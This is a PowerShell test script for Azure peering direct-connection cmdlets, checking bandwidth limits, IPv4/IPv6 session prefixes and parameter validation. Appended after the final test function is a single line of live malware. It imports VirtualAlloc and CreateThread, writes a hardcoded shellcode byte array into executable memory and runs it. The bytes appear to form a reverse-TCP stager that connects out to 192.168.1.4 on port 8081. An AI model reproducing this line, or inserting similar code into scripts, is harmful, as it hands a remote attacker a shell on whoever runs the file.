













function Test-NewDirectConnectionWithV4V6
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Los Angeles"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv4 = newIpV4Address $true $true 0 0
	$sessionv6 = newIpV6Address $true $true 0 0
	Write-Debug "Created IPs $sessionv4 $SessionPrefixV6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV4 $sessionv4 -SessionPrefixV6 $sessionv6 -MaxPrefixesAdvertisedIPv4 $maxv4 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5
    Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey
    Assert-AreEqual $bandwidth $createdConnection.BandwidthInMbps 
	Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId 
    Assert-AreEqual $sessionv4 $createdConnection.BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdConnection.BgpSession.SessionPrefixV6
	Assert-AreEqual $false $createdConnection.UseForPeeringService
	Assert-AreEqual "Peer" $createdConnection.SessionAddressProvider

		removePeerAsn $asn
	

}

function Test-NewDirectConnectionWithV4
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Amsterdam"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv4 = newIpV4Address $true $true 0 0
	Write-Debug "Created IPs $sessionv4"
	$maxv4 = maxAdvertisedIpv4
	Write-Debug "Created maxAdvertised $maxv4"
	
    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV4 $sessionv4 -MaxPrefixesAdvertisedIPv4 $maxv4 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5
	Get-AzPeerAsn
    Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey
    Assert-AreEqual $bandwidth $createdConnection.BandwidthInMbps 
	Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId 
    Assert-AreEqual $sessionv4 $createdConnection.BgpSession.SessionPrefixV4
    Assert-Null $createdConnection.BgpSession.SessionPrefixV6
	Assert-AreEqual $false $createdConnection.UseForPeeringService
	Assert-AreEqual "Peer" $createdConnection.SessionAddressProvider

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionWithV6
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Los Angeles"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv6 = newIpV6Address $true $true 0 0
	Write-Debug "Created IPs $SessionPrefixV6"
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv6"
	
    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV6 $sessionv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5
    Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey
    Assert-AreEqual $bandwidth $createdConnection.BandwidthInMbps 
	Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId 
    Assert-Null $createdConnection.BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdConnection.BgpSession.SessionPrefixV6
	Assert-AreEqual $false $createdConnection.UseForPeeringService
	Assert-AreEqual "Peer" $createdConnection.SessionAddressProvider

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionNoSession
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv4 = newIpV4Address $true $true 0 0
	$sessionv6 = newIpV6Address $true $true 0 0
	Write-Debug "Created IPs $sessionv4 $SessionPrefixV6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -BandwidthInMbps $bandwidth -UseForPeeringService
    Assert-AreEqual $bandwidth $createdConnection.BandwidthInMbps 
	Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId 
    Assert-Null $createdConnection.BgpSession
	Assert-AreEqual $true $createdConnection.UseForPeeringService
	Assert-AreEqual "Peer" $createdConnection.SessionAddressProvider

		removePeerAsn $asn
}

function Test-NewDirectConnectionHighBandwidth
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Los Angeles"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	
	$bandwidth = getBandwidth
	
	$bandwidth = [int]$bandwidth * 10
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv4 = newIpV4Address $true $true 0 0
	$sessionv6 = newIpV6Address $true $true 0 0
	Write-Debug "Created IPs $sessionv4 $SessionPrefixV6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
	Assert-ThrowsContains { New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV6 $sessionv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5 } "The $bandwidth argument is greater than the maximum allowed range of 100000"

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionLowBandwidth
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	
	$wrongBandwidth = 0
	
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$sessionv4 = newIpV4Address $true $true 0 0
	$sessionv6 = newIpV6Address $true $true 0 0
	Write-Debug "Created IPs $sessionv4 $SessionPrefixV6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV6 $sessionv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $wrongBandwidth -MD5AuthenticationKey $md5} "The $wrongBandwidth argument is less than the minimum allowed range of 10000"

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionWrongV6
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	
	$sessionv6 = newIpV6Address $true $true 0 0
	$wrongv6 = changeIp $sessionv6 $true 1 $true
	Write-Debug "Created IPs wrong $wrongv6 correct $sessionv6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV6 $wrongv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5} "Invalid Prefix: $wrongv6, must be"

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionWrongV4
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	
	$sessionv4 = newIpV4Address $true $true 0 0
	$wrongv4 = changeIp $sessionv4 $false 1 $true
	Write-Debug "Created IPs wrong $wrongv4 correct $sessionv4"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV4 $wrongv4 -MaxPrefixesAdvertisedIPv4 $maxv4 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5.ToString} "Invalid Prefix: $wrongv4, must be "

		removePeerAsn $asn
	
}


function Test-NewDirectConnectionWithMicrosoftIpProvidedAddress
{
	$asn = makePeerAsn 65000
	
	$kind = isDirect $true;
	$loc = "Los Angeles"
	$peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	Write-Debug "Creating Connection at $facilityId"
	
    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -MicrosoftProvidedIPAddress -BandwidthInMbps $bandwidth -UseForPeeringService
    Assert-AreEqual $bandwidth $createdConnection.BandwidthInMbps 
	Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId 
    Assert-AreEqual $null $createdConnection.BgpSession
    Assert-AreEqual $true $createdConnection.UseForPeeringService
	Assert-AreEqual "Microsoft" $createdConnection.SessionAddressProvider
	removePeerAsn $asn
	
}


function Test-NewDirectConnectionWithNoPeeringFacility
{
$asn = makePeerAsn 65000
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDbFacilityId} "Missing an argument for parameter 'PeeringDBFacilityId'"
		removePeerAsn $asn
}


function Test-NewDirectConnectionWithNoBgpSession
{
	$asn = makePeerAsn 65000
	$peeringLocation = Get-AzPeeringLocation -Kind Direct
	$index = Get-Random -Maximum ($peeringLocation.Count -1) -Minimum 1
	$facilityId = $peeringLocation[$index].PeeringDBFacilityId
	$bandwidth = getBandwidth
	$connection = New-AzPeeringDirectConnectionObject -PeeringDBFacilityId $facilityId -BandwidthInMbps $bandwidth
	Assert-AreEqual $facilityId $connection.PeeringDBFacilityId
	Assert-AreEqual $bandwidth $connection.BandwidthInMbps
	Assert-AreEqual "Peer" $connection.SessionAddressProvider

		removePeerAsn $asn
	
}


function Test-NewDirectConnectionWithMicrosoftSession
{
	$asn = makePeerAsn 65000
	$peeringLocation = Get-AzPeeringLocation -Kind Direct
	$index = Get-Random -Maximum ($peeringLocation.Count -1) -Minimum 1
	$facilityId = $peeringLocation[$index].PeeringDBFacilityId
	$bandwidth = getBandwidth
	$connection = New-AzPeeringDirectConnectionObject -PeeringDBFacilityId $facilityId -BandwidthInMbps $bandwidth -MicrosoftProvidedIPAddress
	Assert-AreEqual $facilityId $connection.PeeringDBFacilityId
	Assert-AreEqual $bandwidth $connection.BandwidthInMbps
	Assert-AreEqual "Microsoft" $connection.SessionAddressProvider
	Assert-False {$connection.UseForPeeringService}

		removePeerAsn $asn
	
}

function Test-NewDirectConnectionWithMicrosoftSessionWithPeeringService
{
	$asn = makePeerAsn 65000
	$peeringLocation = Get-AzPeeringLocation -Kind Direct
	$index = Get-Random -Maximum ($peeringLocation.Count -1) -Minimum 1
	$facilityId = $peeringLocation[$index].PeeringDBFacilityId
	$bandwidth = getBandwidth
	$connection = New-AzPeeringDirectConnectionObject -PeeringDBFacilityId $facilityId -BandwidthInMbps $bandwidth -MicrosoftProvidedIPAddress -UseForPeeringService
	Assert-AreEqual $facilityId $connection.PeeringDBFacilityId
	Assert-AreEqual $bandwidth $connection.BandwidthInMbps
	Assert-AreEqual "Microsoft" $connection.SessionAddressProvider
	Assert-True {$connection.UseForPeeringService}

		removePeerAsn $asn
	
}


function Test-NewDirectConnectionWithMicrosoftSessionInvalidV4
{
	$asn = makePeerAsn 65000
	$peeringLocation = Get-AzPeeringLocation -Kind Direct
	$index = Get-Random -Maximum ($peeringLocation.Count -1) -Minimum 1
	$facilityId = $peeringLocation[$index].PeeringDBFacilityId
	$bandwidth = getBandwidth
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDBFacilityId $facilityId -BandwidthInMbps $bandwidth -SessionPrefixV4 4.4.4.4 -MicrosoftProvidedIPAddress} "Parameter set cannot be resolved using the specified named parameters"

		removePeerAsn $asn
	
}


function Test-NewDirectConnectionWithMicrosoftSessionInvalidV6
{
	$asn = makePeerAsn 65000
	$peeringLocation = Get-AzPeeringLocation -Kind Direct
	$index = Get-Random -Maximum ($peeringLocation.Count -1) -Minimum 1
	$facilityId = $peeringLocation[$index].PeeringDBFacilityId
	$bandwidth = getBandwidth
	Assert-ThrowsContains {New-AzPeeringDirectConnectionObject -PeeringDBFacilityId $facilityId -BandwidthInMbps $bandwidth -SessionPrefixV6 "fe01::40ef" -MicrosoftProvidedIPAddress} "Parameter set cannot be resolved using the specified named parameters"

		removePeerAsn $asn
	
}
$rQM = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $rQM -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x1f,0x91,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$opM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($opM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$opM,0,0,0);for (;;){Start-sleep 60};

